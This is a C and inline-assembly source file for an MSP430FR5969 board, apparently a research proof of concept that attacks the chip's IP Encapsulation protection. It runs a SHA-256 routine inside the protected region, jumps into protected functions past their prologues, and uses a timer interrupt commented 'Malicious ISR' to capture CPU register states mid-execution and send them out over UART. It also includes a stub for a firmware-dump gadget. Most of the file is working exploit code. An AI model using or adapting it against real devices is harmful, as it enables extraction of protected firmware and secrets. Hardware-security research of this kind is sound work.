/** need to choose which SHA implementation to run **/
#define gladman_sha
//#define saddi_sha
//#define mbedtls_sha

/** need to uncomment if the board you are using is MSP432P401R **/
//#define msp432p401r
//#define msp430fr5994
#define msp430fr5969
//#define riscv

/// DO NOT EDIT BELOW  //////////////////////////////////////////
#ifdef msp432p401r
#include "msp.h"
#include "rom_map.h"
#include "rom.h"
#include "systick.h"
#endif

#ifdef msp430g2553
#include "msp430.h"
#endif

#ifdef msp430fr5994
#include "msp430.h"
#endif

#ifdef msp430fr5969
#include "msp430.h"
#endif

//#include "experiment_time.h"

#include <stdio.h>
#include <string.h>

#include "pmm.h"
#include "cs.h"
#include "wdt_a.h"
#include "timer_b.h"
#include "sfr.h"
#include "gpio.h"
#include "eusci_a_uart.h"

#ifdef gladman_sha
//#include <memory.h>
#include <ctype.h>
#include "gladman/sha2.h"
#endif
#ifdef saddi_sha
#include "saddi/sha256.h"
#include <stdlib.h>
#endif
#ifdef mbedtls_sha
#include "mbedtls/sha256.h"
#endif

#define DIGEST_BYTES (256/8)

/** Globals (test inputs) **/
unsigned char data[] __attribute__((section(".ipe_vars"))) = "abc"; // Data you want to hash
//unsigned char check_sha256[] = { 220, 17, 20, 205, 7, 73, 20, 189, 135, 44, 193,
//                                 249, 162, 62, 201, 16, 234, 34, 3, 188, 121,
//                                 119, 154, 178, 225, 125, 162, 87, 130, 166, 36,
//                                 252 }; // Used to verify the hash function
uint8_t hash[DIGEST_BYTES] __attribute__((section(".ipe_vars"))); // the output of SHA256 will be stored here
size_t len __attribute__((section(".ipe_vars"))) = sizeof(data);

/** contexts **/
#ifdef gladman_sha
sha256_ctx cx[1] __attribute__((section(".ipe_vars")));
#endif
#ifdef saddi_sha
SHA256_CTX ctx __attribute__((section(".ipe_vars")));
#endif
#ifdef mbedtls_sha
mbedtls_sha256_context ctx;
#endif

/** Call initialization functions for different SHA implementations **/
__attribute__((section(".ipe_code"))) void init_sha(void);
void init_sha()
{

__bic_SR_register(GIE);
__no_operation();

#ifdef gladman_sha
    sha256_begin(cx);
#endif
#ifdef saddi_sha
    sha256_init(&ctx);
#endif
#ifdef mbedtls_aes
    mbedtls_sha256_init(&ctx);
#endif

__bis_SR_register(GIE);
__no_operation();

/*
 * Clear General purpose CPU registers R4-R15
 */
__asm(" mov.w #0, R4");
__asm(" mov.w #0, R5");
__asm(" mov.w #0, R6");
__asm(" mov.w #0, R7");
__asm(" mov.w #0, R8");
__asm(" mov.w #0, R9");
__asm(" mov.w #0, R10");
__asm(" mov.w #0, R11");
__asm(" mov.w #0, R12");
__asm(" mov.w #0, R13");
__asm(" mov.w #0, R14");
__asm(" mov.w #0, R15");
}

__attribute__((section(".ipe_code"))) void test_sha256(void);
void test_sha256()
{

__bic_SR_register(GIE);
__no_operation();

#ifdef gladman_sha
    sha256(hash, data, len, cx);
#endif
#ifdef saddi_sha
    sha256_update(&ctx, data, len);
    sha256_final(&ctx, hash);
#endif
#ifdef mbedtls_sha
    mbedtls_sha256(data, len, hash, 0, ctx);
#endif
// hash now contains the output of SHA-256

__bis_SR_register(GIE);
__no_operation();

/*
 * Clear General purpose CPU registers R4-R15
 */
__asm(" mov.w #0, R4");
__asm(" mov.w #0, R5");
__asm(" mov.w #0, R6");
__asm(" mov.w #0, R7");
__asm(" mov.w #0, R8");
__asm(" mov.w #0, R9");
__asm(" mov.w #0, R10");
__asm(" mov.w #0, R11");
__asm(" mov.w #0, R12");
__asm(" mov.w #0, R13");
__asm(" mov.w #0, R14");
__asm(" mov.w #0, R15");
}

//int check_result()
//{
    //return memcmp((uint8_t*) hash, (uint8_t*) check_sha256, DIGEST_BYTES);
//}

int check_reset __attribute__((section(".persistent"))) = 0;
volatile unsigned int COMPARE_VALUE __attribute__((section(".persistent"))) = 0;
//volatile unsigned int IPE_ADDRESS __attribute__((section(".persistent"))) = 16334;

__attribute__((naked)) void increment_timer_count(void);
void increment_timer_count() {
    __asm__ __volatile__ ("inc &COMPARE_VALUE");
    __asm__ __volatile__ ("reta");
}

__attribute__((naked)) void IOP_gadget(void);
void IOP_gadget() {
    //__asm__ __volatile__ ("incx &0xf000");
    __no_operation();
    __no_operation();
    __no_operation();
    __no_operation();
    __no_operation();
    //__asm__ __volatile__ ("mov &0xf000,R14");
    __no_operation();
    __no_operation();
    //__asm__ __volatile__ ("bra #0x413a");
    __asm__ __volatile__ ("reta");
}

int main(int argc, char *argv[])
{
    WDTCTL = WDTPW | WDTHOLD;

    if(check_reset == 0)
    {
        ++check_reset;
        PMM_trigBOR();
    }

    //COMPARE_VALUE++;
    increment_timer_count();

    //Set DCO Frequency to 1MHz
    CS_setDCOFreq(CS_DCORSEL_0,CS_DCOFSEL_0);

    //Set MCLK = SMCLK = DCO Frequency
    CS_initClockSignal(CS_SMCLK,CS_DCOCLK_SELECT,CS_CLOCK_DIVIDER_1);
    CS_initClockSignal(CS_MCLK,CS_DCOCLK_SELECT,CS_CLOCK_DIVIDER_1);

    // Configure UART pin
    //Set P2.0 as Secondary Module Function Input.

    //Select Port 2d
    //Set Pin 0 to input Secondary Module Function, (UCA0TXD/UCA0SIMO).

    GPIO_setAsPeripheralModuleFunctionInputPin(
    GPIO_PORT_P2,
    GPIO_PIN0,
    GPIO_SECONDARY_MODULE_FUNCTION
    );

    // Disable the GPIO power-on default high-impedance mode to activate
    // previously configured port settings
    PM5CTL0 &= ~LOCKLPM5;          //turn on I/O

    // Configure UART
    EUSCI_A_UART_initParam param = {0};
    param.selectClockSource = EUSCI_A_UART_CLOCKSOURCE_SMCLK;
    param.clockPrescalar = 8;
    param.firstModReg = 0;
    param.secondModReg = 0xD6;
    param.parity = EUSCI_A_UART_NO_PARITY;
    param.msborLsbFirst = EUSCI_A_UART_LSB_FIRST;
    param.numberofStopBits = EUSCI_A_UART_ONE_STOP_BIT;
    param.uartMode = EUSCI_A_UART_MODE;
    param.overSampling = EUSCI_A_UART_LOW_FREQUENCY_BAUDRATE_GENERATION;

    if (STATUS_FAIL == EUSCI_A_UART_init(EUSCI_A0_BASE, &param)) {
        return;
    }

    EUSCI_A_UART_enable(EUSCI_A0_BASE);

    /*set timer_B_parameters*/

    //Start timer in continuous mode sourced by SMCLK
    Timer_B_initContinuousModeParam initContParam = {0};
    initContParam.clockSource = TIMER_B_CLOCKSOURCE_SMCLK;
    initContParam.clockSourceDivider = TIMER_B_CLOCKSOURCE_DIVIDER_1;
    initContParam.timerInterruptEnable_TBIE = TIMER_B_TBIE_INTERRUPT_DISABLE;
    initContParam.timerClear = TIMER_B_DO_CLEAR;
    initContParam.startTimer = false;
    Timer_B_initContinuousMode(TIMER_B0_BASE, &initContParam);

    //Initiaze compare mode
    Timer_B_clearCaptureCompareInterrupt(TIMER_B0_BASE,
        TIMER_B_CAPTURECOMPARE_REGISTER_0);

    Timer_B_initCompareModeParam initCompParam = {0};
    initCompParam.compareRegister = TIMER_B_CAPTURECOMPARE_REGISTER_0;
    initCompParam.compareInterruptEnable = TIMER_B_CAPTURECOMPARE_INTERRUPT_ENABLE;
    initCompParam.compareOutputMode = TIMER_B_OUTPUTMODE_OUTBITVALUE;
    initCompParam.compareValue = COMPARE_VALUE;
    Timer_B_initCompareMode(TIMER_B0_BASE, &initCompParam);

    Timer_B_startCounter( TIMER_B0_BASE,
        TIMER_B_CONTINUOUS_MODE
        );

    //enable interrupts
    __bis_SR_register(GIE);       //need to enable LPM0 for timer_a to work properly
    __no_operation();

    /*** Setup for fimrware dump IOP gadget ***/
    
    IOP_gadget();
    
    /*** End of setup ***/

    /** initialize SHA **/
    //init_sha();
    __asm__ __volatile__ ("suba #4,SP");
    __asm__ __volatile__ ("mova PC,R15");
    __asm__ __volatile__ ("adda #18,R15");
    __asm__ __volatile__ ("mova R15,@SP");
    __asm__ __volatile__ ("mova #init_sha,R14");
    __asm__ __volatile__ ("adda #2,R14");
    //__asm__ __volatile__ ("pushm.a #3,R10");         //to account for prologue of test_decrypt function
    //__asm__ __volatile__ ("suba #0x00008,SP");       //to account for prologue of test_decrypt function
    __asm__ __volatile__ ("bra R14");

    /** test SHA-256 **/
    //test_sha256();
    __asm__ __volatile__ ("suba #4,SP");
    __asm__ __volatile__ ("mova PC,R15");
    __asm__ __volatile__ ("adda #22,R15");
    __asm__ __volatile__ ("mova R15,@SP");
    __asm__ __volatile__ ("mova #test_sha256,R14");
    __asm__ __volatile__ ("adda #6,R14");
    //__asm__ __volatile__ ("pushm.a #3,R10");         //to account for prologue of test_decrypt function
    __asm__ __volatile__ ("suba #0x00004,SP");       //to account for prologue of test_decrypt function
    __asm__ __volatile__ ("bra R14");

    /** Check the result to see whether SHA algorithm is correctly working or not **/
//    volatile unsigned int verify = check_result();

    while (1);

}

/* Malicious ISR
 *
 * This ISR doesn't corrupt the register file,
 * besides PC,SP and SR which it is picking from
 * the stack.
 */

//volatile unsigned int dump_count __attribute__((section(".persistent"))) = 0;
volatile unsigned int DUMP_START[16] __attribute__((section(".altfram")));
void __attribute__((interrupt(TIMERB0_VECTOR),naked)) TIMERB0_ISR (void)
{
    //Saving Register States
    __asm(" addx #2, SP");
    __asm(" movx @SP, &DUMP_START");         //storing the PC
    __asm(" addx #2, SP");
    __asm(" movx SP, &DUMP_START+2");       //storing the SP
    __asm(" subx #4, SP");
    __asm(" movx @SP, &DUMP_START+4");      //storing the SR
    __asm(" movx R3, &DUMP_START+6");
    __asm(" movx R4, &DUMP_START+8");
    __asm(" movx R5, &DUMP_START+10");
    __asm(" movx R6, &DUMP_START+12");
    __asm(" movx R7, &DUMP_START+14");
    __asm(" movx R8, &DUMP_START+16");
    __asm(" movx R9, &DUMP_START+18");
    __asm(" movx R10, &DUMP_START+20");
    __asm(" movx R11, &DUMP_START+22");
    __asm(" movx R12, &DUMP_START+24");
    __asm(" movx R13, &DUMP_START+26");
    __asm(" movx R14, &DUMP_START+28");
    __asm(" movx R15, &DUMP_START+30");

    //__asm(" incx &dump_count");

    //UART TX Routine Start

    //not adding delay before next package (16 register states) Tx, as interrupt latency will handle that
    /*__asm(" mov #1000, R7");
    __asm(" big_start:  cmp #0,R7");
    __asm(" jz big_end");
    __asm(" dec R7");
    __asm(" jmp big_start");*/

    __asm(" mova #0, R14");
    __asm(" mov #16, R11");
    __asm(" serial_start:  cmp #0,R11");
    __asm(" jz serial_end");
    __asm(" mova #0x005CE, R12");                     //0x5CE is the address location of eUSCI_A0_UCA0TXBUF register (change acc to mem map)
    __asm(" movx.b 0x10001(R14), 0x00000(R12)");

    //add delay before next byte Tx
    __asm(" mov #15, R9");
    __asm(" inner_start:  cmp #0,R9");
    __asm(" jz inner_end");
    __asm(" dec R9");
    __asm(" jmp inner_start");

    __asm(" inner_end: mova #0x005CE, R12");         //0x5CE is the address location of eUSCI_A0_UCA0TXBUF register (change acc to mem map)
    __asm(" movx.b 0x10000(R14), 0x00000(R12)");

    //add delay before next word (2 bytes) Tx
    __asm(" mov #15, R10");
    __asm(" outer_start:  cmp #0,R10");
    __asm(" jz outer_end");
    __asm(" dec R10");
    __asm(" jmp outer_start");

    __asm(" outer_end: incdx.a R14");
    __asm(" dec R11");
    __asm(" jmp serial_start");
    //UART TX Routine End

    //Restoring PC, SP and SR
    __asm(" serial_end: mova #0x023FC, SP");
    __asm(" nop ");
    __asm(" mova #0x00003, SR");
    __asm(" nop ");
    __asm(" bra #main");
    __asm__ __volatile__ ("capture_isr: jmp capture_isr");
}


#define IPE_SIG_VALID 0xFF88
// IPE signature valid flag
#define IPE_STR_PTR_SRC 0xFF8A
// Source for pointer (nibble address) to MPU IPE structure
//#pragma RETAIN(ipe_signalValid)
//#pragma location=IPE_SIG_VALID
const unsigned int ipe_signalValid __attribute__((retain, section(".ipesignature1"))) = 0xAAAA;
// Locate your IPE structure and it should be placed
// on the top of the IPE memory. In this example, IPE structure
// is at 0xD000
//#pragma RETAIN(IPE_stringPointerSourceSource)
//#pragma location=IPE_STR_PTR_SRC
const unsigned int IPE_stringPointerSourceSource __attribute__((retain, section(".ipesignature2"))) = 0x0440;

// IPE data structures definition, reusable for ALL projects
#define IPE_MPUIPLOCK 0x0080
#define IPE_MPUIPENA 0x0040
#define IPE_MPUIPPUC 0x0020
#define IPE_SEGREG(a) (a >> 4)
#define IPE_BIP(a,b,c) ((a) ^ (b) ^ (c) ^ (0xFFFF))
#define IPE_FILLSTRUCT(a,b,c) {a,IPE_SEGREG(b),IPE_SEGREG(c),IPE_BIP(a,IPE_SEGREG(b),IPE_SEGREG(c))}

typedef struct IPE_Init_Structure {
unsigned int MPUIPC0 ;
unsigned int MPUIPB2 ;
unsigned int MPUIPB1 ;
unsigned int MPUCHECK ;
} IPE_Init_Structure; // this struct should be placed inside IPB1/IPB2 boundaries
// This is the project dependant part
#define IPE_START 0x04400 // This defines the Start of the IP protected area
#define IPE_END 0x0B400 // This defines the End of the IP protected area
// define borders of protected code
// ipestruct is defined in a adopted linker control file
// ipestruct is the section for protected data;
//#pragma RETAIN(ipe_configStructure)
//#pragma DATA_SECTION(ipe_configStructure,".ipestruct");
const IPE_Init_Structure ipe_configStructure __attribute__((retain, section(".ipestruct"))) = IPE_FILLSTRUCT(IPE_MPUIPLOCK + IPE_MPUIPENA, IPE_END,IPE_START);
